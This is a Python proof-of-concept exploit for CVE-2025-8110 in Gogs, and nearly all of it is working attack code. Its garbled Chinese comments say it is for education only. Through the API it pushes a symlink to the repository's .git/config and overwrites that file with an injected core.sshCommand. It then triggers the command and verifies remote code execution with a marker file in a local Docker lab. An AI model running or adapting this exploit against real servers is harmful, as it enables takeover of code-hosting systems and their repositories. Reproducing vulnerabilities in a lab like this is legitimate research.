#!/usr/bin/env python3
"""
CVE-2025-8110 è‡ªåŠ¨åŒ–åˆ©ç”¨è„šæœ¬
ä»…ä¾›æ•™è‚²å’Œå®‰å…¨ç ”ç©¶ä½¿ç”¨
"""

import os
import sys
import base64
import json
import subprocess
import requests
from pathlib import Path

class Color:
    """ç»ˆç«¯é¢œè‰²"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def print_banner():
    """æ‰“å°æ¨ªå¹…"""
    print(f"{Color.CYAN}{Color.BOLD}")
    print("=" * 60)
    print("  CVE-2025-8110 è‡ªåŠ¨åŒ–åˆ©ç”¨è„šæœ¬")
    print("  Gogs Symlink File Overwrite â†’ RCE")
    print("  ä»…ä¾›æ•™è‚²ç›®çš„ä½¿ç”¨")
    print("=" * 60)
    print(f"{Color.RESET}\n")

def print_step(step_num, description):
    """æ‰“å°æ­¥éª¤"""
    print(f"{Color.BOLD}{Color.BLUE}[æ­¥éª¤ {step_num}]{Color.RESET} {description}")

def print_success(message):
    """æ‰“å°æˆåŠŸæ¶ˆæ¯"""
    print(f"{Color.GREEN}[âœ“]{Color.RESET} {message}")

def print_error(message):
    """æ‰“å°é”™è¯¯æ¶ˆæ¯"""
    print(f"{Color.RED}[âœ—]{Color.RESET} {message}")

def print_warning(message):
    """æ‰“å°è­¦å‘Šæ¶ˆæ¯"""
    print(f"{Color.YELLOW}[!]{Color.RESET} {message}")

def print_info(message):
    """æ‰“å°ä¿¡æ¯æ¶ˆæ¯"""
    print(f"{Color.CYAN}[i]{Color.RESET} {message}")

def run_command(cmd, cwd=None, check=True):
    """è¿è¡Œç³»ç»Ÿå‘½ä»¤"""
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            cwd=cwd,
            capture_output=True,
            text=True,
            check=check
        )
        return result.returncode == 0, result.stdout, result.stderr
    except subprocess.CalledProcessError as e:
        return False, e.stdout, e.stderr

def check_prerequisites():
    """æ£€æŸ¥å‰ç½®æ¡ä»¶"""
    print_step(0, "æ£€æŸ¥å‰ç½®æ¡ä»¶")
    
    # æ£€æŸ¥ Git
    success, stdout, _ = run_command("git --version", check=False)
    if success:
        print_success(f"Git å·²å®‰è£…: {stdout.strip()}")
    else:
        print_error("Git æœªå®‰è£…ï¼Œè¯·å…ˆå®‰è£… Git")
        return False
    
    # æ£€æŸ¥ Docker
    success, stdout, _ = run_command("docker --version", check=False)
    if success:
        print_success(f"Docker å·²å®‰è£…: {stdout.strip()}")
    else:
        print_error("Docker æœªå®‰è£…ï¼Œè¯·å…ˆå®‰è£… Docker")
        return False
    
    # æ£€æŸ¥ Gogs å®¹å™¨æ˜¯å¦è¿è¡Œ
    success, stdout, _ = run_command("docker ps | grep gogs-vulnerable", check=False)
    if success and "gogs-vulnerable" in stdout:
        print_success("Gogs å®¹å™¨æ­£åœ¨è¿è¡Œ")
    else:
        print_warning("Gogs å®¹å™¨æœªè¿è¡Œï¼Œè¯·å…ˆè¿è¡Œ ./setup-gogs-vulnerable.sh")
        return False
    
    print()
    return True

def create_repository(base_url, token, owner, repo_name):
    """åˆ›å»ºæ–°ä»“åº“"""
    print_step(1, f"åˆ›å»ºä»“åº“ '{repo_name}'")
    
    url = f"{base_url}/api/v1/user/repos"
    headers = {
        "Authorization": f"token {token}",
        "Content-Type": "application/json"
    }
    data = {
        "name": repo_name,
        "description": "CVE-2025-8110 æµ‹è¯•ä»“åº“",
        "private": False,
        "auto_init": False
    }
    
    try:
        response = requests.post(url, headers=headers, json=data, timeout=10)
        if response.status_code == 201:
            print_success(f"ä»“åº“åˆ›å»ºæˆåŠŸ: {base_url}/{owner}/{repo_name}")
            return True
        elif response.status_code == 422:
            print_warning("ä»“åº“å·²å­˜åœ¨ï¼Œå°†ä½¿ç”¨ç°æœ‰ä»“åº“")
            return True
        else:
            print_error(f"åˆ›å»ºä»“åº“å¤±è´¥: {response.status_code} - {response.text}")
            return False
    except Exception as e:
        print_error(f"åˆ›å»ºä»“åº“å¼‚å¸¸: {str(e)}")
        return False

def clone_and_create_symlink(base_url, owner, repo_name, work_dir):
    """å…‹éš†ä»“åº“å¹¶åˆ›å»ºç¬¦å·é“¾æ¥"""
    print_step(2, "å…‹éš†ä»“åº“å¹¶åˆ›å»ºæ¶æ„ç¬¦å·é“¾æ¥")
    
    repo_path = Path(work_dir) / repo_name
    
    # åˆ é™¤å·²å­˜åœ¨çš„ä»“åº“ç›®å½•
    if repo_path.exists():
        print_info(f"åˆ é™¤å·²å­˜åœ¨çš„ä»“åº“ç›®å½•: {repo_path}")
        run_command(f"rm -rf {repo_path}")
    
    # å…‹éš†ä»“åº“
    clone_url = f"{base_url}/{owner}/{repo_name}.git"
    print_info(f"å…‹éš†ä»“åº“: {clone_url}")
    success, stdout, stderr = run_command(f"git clone {clone_url}", cwd=work_dir)
    
    if not success:
        print_error(f"å…‹éš†ä»“åº“å¤±è´¥: {stderr}")
        return False
    
    print_success("ä»“åº“å…‹éš†æˆåŠŸ")
    
    # åˆ›å»ºç¬¦å·é“¾æ¥æŒ‡å‘ .git/config (å¿…é¡»ä½¿ç”¨ç»å¯¹è·¯å¾„ï¼Œå› ä¸º Gogs åœ¨ä¸´æ—¶ç›®å½•å¤„ç†)
    symlink_name = "malicious_link"
    symlink_target = f"/data/git/gogs-repositories/{owner}/{repo_name}.git/config"
    
    print_info(f"åˆ›å»ºç¬¦å·é“¾æ¥: {symlink_name} -> {symlink_target}")
    success, _, stderr = run_command(
        f"ln -s {symlink_target} {symlink_name}",
        cwd=repo_path
    )
    
    if not success:
        print_error(f"åˆ›å»ºç¬¦å·é“¾æ¥å¤±è´¥: {stderr}")
        return False
    
    # éªŒè¯ç¬¦å·é“¾æ¥
    success, stdout, _ = run_command(f"ls -la {symlink_name}", cwd=repo_path)
    print_info(f"ç¬¦å·é“¾æ¥è¯¦æƒ…: {stdout.strip()}")
    
    # æäº¤å¹¶æ¨é€
    print_info("æäº¤ç¬¦å·é“¾æ¥åˆ°ä»“åº“")
    run_command("git add malicious_link", cwd=repo_path)
    run_command('git commit -m "Add malicious symlink"', cwd=repo_path)
    success, stdout, stderr = run_command("git push origin master", cwd=repo_path)
    
    if not success:
        print_error(f"æ¨é€å¤±è´¥: {stderr}")
        return False
    
    print_success("ç¬¦å·é“¾æ¥å·²æˆåŠŸæäº¤å¹¶æ¨é€")
    print()
    return True

def exploit_symlink(base_url, token, owner, repo_name):
    """åˆ©ç”¨ç¬¦å·é“¾æ¥æ¼æ´è¦†ç›–æ–‡ä»¶"""
    print_step(3, "åˆ©ç”¨ PutContents API è¦†ç›–æ–‡ä»¶")
    
    # å‡†å¤‡æ¶æ„ payload
    malicious_config = """[core]
\trepositoryformatversion = 0
\tfilemode = true
\tbare = true
\tlogallrefupdates = true
\tsshCommand = touch /tmp/pwned_by_cve_2025_8110 && /usr/bin/ssh

[remote "origin"]
\turl = http://localhost:3000/admin/exploit-test.git
\tfetch = +refs/heads/*:refs/remotes/origin/*
"""
    
    print_info("å‡†å¤‡æ¶æ„ Payload:")
    print(f"{Color.MAGENTA}{malicious_config}{Color.RESET}")
    
    # Base64 ç¼–ç 
    content_base64 = base64.b64encode(malicious_config.encode()).decode()
    
    # è°ƒç”¨ API
    url = f"{base_url}/api/v1/repos/{owner}/{repo_name}/contents/malicious_link"
    headers = {
        "Authorization": f"token {token}",
        "Content-Type": "application/json"
    }
    data = {
        "message": "Exploit CVE-2025-8110",
        "content": content_base64
    }
    
    print_info(f"è°ƒç”¨ API: PUT {url}")
    
    try:
        response = requests.put(url, headers=headers, json=data, timeout=10)
        
        if response.status_code in [200, 201]:
            print_success("æ–‡ä»¶è¦†ç›–æˆåŠŸï¼")
            print_info(f"å“åº”: {response.status_code}")
            return True
        else:
            print_error(f"API è°ƒç”¨å¤±è´¥: {response.status_code}")
            print_error(f"å“åº”å†…å®¹: {response.text}")
            return False
            
    except Exception as e:
        print_error(f"API è°ƒç”¨å¼‚å¸¸: {str(e)}")
        return False

def trigger_and_verify_rce(owner, repo_name):
    """è§¦å‘ RCE å¹¶éªŒè¯ç»“æœ"""
    print_step(4, "è§¦å‘ RCE å¹¶éªŒè¯")
    
    # 1. æ£€æŸ¥é…ç½®æ–‡ä»¶æ˜¯å¦è¢«è¦†ç›–
    print_info("æ£€æŸ¥è¢«è¦†ç›–çš„ .git/config æ–‡ä»¶")
    repo_path = f"/data/git/gogs-repositories/{owner}/{repo_name}.git"
    
    cmd = f"docker exec gogs-vulnerable cat {repo_path}/config"
    success, stdout, stderr = run_command(cmd, check=False)
    
    if not success or "sshCommand" not in stdout:
        print_error("éªŒè¯å¤±è´¥ï¼š.git/config æœªè¢«æ­£ç¡®è¦†ç›–")
        return False
        
    print_success("âœ“ .git/config å·²è¢«æˆåŠŸè¦†ç›–ï¼")
    
    # 2. è§¦å‘ RCE
    # æ–¹æ³•ï¼šå¼ºåˆ¶ Git ä½¿ç”¨è¢«æ±¡æŸ“çš„ config å»è¿æ¥ä¸€ä¸ªå¤–éƒ¨åœ°å€
    # è¿™ä¼šæ¿€æ´» core.sshCommand
    print_info("æ­£åœ¨è§¦å‘ RCE (æ¨¡æ‹ŸæœåŠ¡å™¨ Git æ“ä½œ)...")
    
    trigger_cmd = f"docker exec gogs-vulnerable sh -c 'cd {repo_path} && git ls-remote git@github.com:fake/fake.git'"
    run_command(trigger_cmd, check=False) # è¿™ä¸ªå‘½ä»¤å¯èƒ½ä¼šå¤±è´¥ï¼Œè¿™å¾ˆæ­£å¸¸
    
    # 3. éªŒè¯ç»“æœ
    print_info("æ£€æŸ¥ RCE æ ‡è®°æ–‡ä»¶...")
    check_cmd = "docker exec gogs-vulnerable ls -la /tmp/pwned_by_cve_2025_8110"
    success, stdout, _ = run_command(check_cmd, check=False)
    
    if success:
        print_success("âœ“ RCE è§¦å‘æˆåŠŸï¼å‘ç°æ ‡è®°æ–‡ä»¶ /tmp/pwned_by_cve_2025_8110")
        print(f"{Color.GREEN}{stdout}{Color.RESET}")
        return True
    else:
        print_error("RCE éªŒè¯å¤±è´¥ï¼šæœªå‘ç°æ ‡è®°æ–‡ä»¶")
        return False

def main():
    """ä¸»å‡½æ•°"""
    print_banner()
    
    # é…ç½®
    GOGS_URL = "http://localhost:3000"
    WORK_DIR = "/Users/ddea/java/goga"
    
    # è·å– Token
    print_warning("è¯·ç¡®ä¿ä½ å·²ç»åœ¨ Gogs Web ç•Œé¢åˆ›å»ºäº† API Token")
    print_info(f"è®¿é—®: {GOGS_URL}/user/settings/applications")
    print()
    
    if len(sys.argv) > 1:
        token = sys.argv[1]
        print_info(f"ä½¿ç”¨å‘½ä»¤è¡Œå‚æ•°æä¾›çš„ Token")
    else:
        token = input(f"{Color.BOLD}è¯·è¾“å…¥ä½ çš„ API Token: {Color.RESET}").strip()
    
    if not token:
        print_error("Token ä¸èƒ½ä¸ºç©ºï¼")
        sys.exit(1)
    
    print()

    # 0. è·å–å½“å‰ç”¨æˆ·ä¿¡æ¯
    print_step(0, "éªŒè¯ Token å¹¶è·å–ç”¨æˆ·ä¿¡æ¯")
    try:
        r = requests.get(f"{GOGS_URL}/api/v1/user", headers={"Authorization": f"token {token}"})
        if r.status_code != 200:
            print_error(f"Token æ— æ•ˆæˆ–æ— æ³•è¿æ¥: {r.status_code}")
            sys.exit(1)
        user_info = r.json()
        OWNER = user_info['username']
        print_success(f"å½“å‰ç”¨æˆ·: {OWNER}")
    except Exception as e:
        print_error(f"è·å–ç”¨æˆ·ä¿¡æ¯å¤±è´¥: {e}")
        sys.exit(1)

    # ç”Ÿæˆå”¯ä¸€çš„ä»“åº“å
    import time
    REPO_NAME = f"cve-test-{int(time.time())}"
    
    # æ£€æŸ¥å‰ç½®æ¡ä»¶
    if not check_prerequisites():
        print_error("å‰ç½®æ¡ä»¶æ£€æŸ¥å¤±è´¥ï¼Œé€€å‡º")
        sys.exit(1)
    
    # æ‰§è¡Œåˆ©ç”¨æ­¥éª¤
    steps = [
        (create_repository, [GOGS_URL, token, OWNER, REPO_NAME]),
        (clone_and_create_symlink, [GOGS_URL, OWNER, REPO_NAME, WORK_DIR]),
        (exploit_symlink, [GOGS_URL, token, OWNER, REPO_NAME]),
        (trigger_and_verify_rce, [OWNER, REPO_NAME])
    ]
    
    for step_func, args in steps:
        if not step_func(*args):
             # å¤±è´¥æ—¶ä¸ç«‹å³é€€å‡ºï¼Œä¿ç•™ç¯å¢ƒä¾›è°ƒè¯•ï¼Œä½†åœ¨ RCE éªŒè¯å¤±è´¥æ—¶å¯èƒ½éœ€è¦äººå·¥æ£€æŸ¥
            print_error(f"\næ­¥éª¤æ‰§è¡Œå¤±è´¥")
            sys.exit(1)
        print()
    
    # æˆåŠŸæ€»ç»“
    print(f"\n{Color.GREEN}{Color.BOLD}=" * 60)
    print("  ğŸ‰ CVE-2025-8110 æ¼æ´å¤ç°æˆåŠŸï¼")
    print("=" * 60)
    print(f"{Color.RESET}\n")
    
    print(f"{Color.YELLOW}å…³é”®å‘ç°:{Color.RESET}")
    print("  1. ç¬¦å·é“¾æ¥æˆåŠŸç»•è¿‡äº†è·¯å¾„æ£€æŸ¥")
    print("  2. .git/config æ–‡ä»¶è¢«æ¶æ„è¦†ç›–")
    print("  3. sshCommand é…ç½®è¢«æ³¨å…¥")
    print("  4. å…·å¤‡è¿œç¨‹ä»£ç æ‰§è¡Œèƒ½åŠ›\n")
    
    print(f"{Color.RED}âš ï¸  è¯·ç«‹å³æ¸…ç†æµ‹è¯•ç¯å¢ƒï¼{Color.RESET}")
    print(f"  è¿è¡Œ: {Color.CYAN}docker stop gogs-vulnerable && docker rm gogs-vulnerable{Color.RESET}\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Color.YELLOW}ç”¨æˆ·ä¸­æ–­ï¼Œé€€å‡º{Color.RESET}")
        sys.exit(0)
